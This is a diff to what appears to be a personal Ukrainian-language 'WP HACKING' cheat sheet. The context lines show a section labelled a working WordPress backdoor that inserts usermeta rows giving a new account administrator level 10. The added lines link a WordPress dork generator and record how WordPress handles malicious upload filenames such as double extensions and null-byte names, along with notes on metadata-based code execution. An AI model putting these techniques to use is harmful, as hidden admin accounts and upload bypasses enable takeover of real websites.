@@ -119,6 +119,7 @@ WP HACKING
 @@@@@@@@@@@@@@@@@@@@@@
 
 https://wpdirectory.net - база даних регулярних виразів WordPress.
+https://dorks.faisalahmed.me - авто-дорки wordpress.
 
 /* WordPress Backdoor - Automating Create New Admin */ (робочий!!)
 
@@ -156,3 +157,14 @@ INSERT INTO `prefixdatabase_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_
 INSERT INTO `prefixdatabase_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, 'ID_of_new_user_see_in_wp_users', 'wp_user_level', '10');
  
 DONE.
+
+
+--- Логіка серверів і Wordpress----
+
+- wordpress по замовчуванню модифікує файли image.php.jpg в image.php_.jpg
+- image.jpg%00.php%00.jpg в image1.php00.jpg
+- пробіл замінив -
+- hex-вміст не чистить
+- метадані не затирає
+- Техніка з виконанням коду із метаданих на сьогоднішній день підтримується лише деякими застарілими серверами і PHP. Сучасні сервери захищені.
+- Короче, я так зрозумів. якщо сервер валідує всі файли і не пропускає нічого крім зображень, а вихідний код не зчитує ні з метаданих, ні з hex, ні з чого. то неможливо.. якщо сервер правильно перевіряє файли і виключає всі можливі вектори обходу, то атака через завантаження шкідливого коду неможлива. Такий сервер забезпечує надійний захист, якщо виконуються наступні умови.
